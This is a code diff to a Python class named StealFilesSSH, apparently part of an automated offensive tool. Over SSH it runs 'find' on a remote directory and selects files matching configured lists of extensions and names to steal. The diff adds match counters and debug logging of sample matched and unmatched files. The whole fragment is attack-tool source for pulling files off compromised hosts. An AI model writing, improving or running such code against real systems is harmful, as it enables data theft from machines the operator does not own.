@@ -56,15 +56,44 @@ class StealFilesSSH:
             stdin, stdout, stderr = ssh.exec_command(f'find {dir_path} -type f')
             files = stdout.read().decode().splitlines()
             matching_files = []
+            ext_match_count = 0
+            name_match_count = 0
+            sample_matches = []
+            sample_non_matches = []
+
             for file in files:
-                if self.shared_data.orchestrator_should_exit :
+                if self.shared_data.orchestrator_should_exit:
                     logger.info("File search interrupted.")
                     return []
-                if any(file.endswith(ext) for ext in self.shared_data.steal_file_extensions) or \
-                   any(file_name in file for file_name in self.shared_data.steal_file_names):
+
+                ext_match = any(file.endswith(ext) for ext in self.shared_data.steal_file_extensions)
+                name_match = any(file_name in file for file_name in self.shared_data.steal_file_names)
+
+                if ext_match or name_match:
                     matching_files.append(file)
+                    if ext_match:
+                        ext_match_count += 1
+                    if name_match:
+                        name_match_count += 1
+                    if len(sample_matches) < 5:
+                        reasons = []
+                        if ext_match:
+                            reasons.append("extension")
+                        if name_match:
+                            reasons.append("name")
+                        sample_matches.append(f"{file} ({'/'.join(reasons)})")
+                elif len(sample_non_matches) < 5:
+                    sample_non_matches.append(file)
+
             display_dir = dir_path if dir_path == '/' else dir_path.rstrip('/') + '/'
-            logger.info(f"Found {len(matching_files)} matching files in {display_dir}")
+            logger.info(
+                f"Found {len(matching_files)} matching files in {display_dir} "
+                f"(scanned {len(files)}, extension matches {ext_match_count}, name matches {name_match_count})"
+            )
+            if sample_matches:
+                logger.debug(f"Sample matched files: {'; '.join(sample_matches)}")
+            elif sample_non_matches:
+                logger.debug(f"Sample scanned files (no match): {'; '.join(sample_non_matches)}")
             return matching_files
         except Exception as e:
             logger.error(f"Error finding files in directory {dir_path}: {e}")
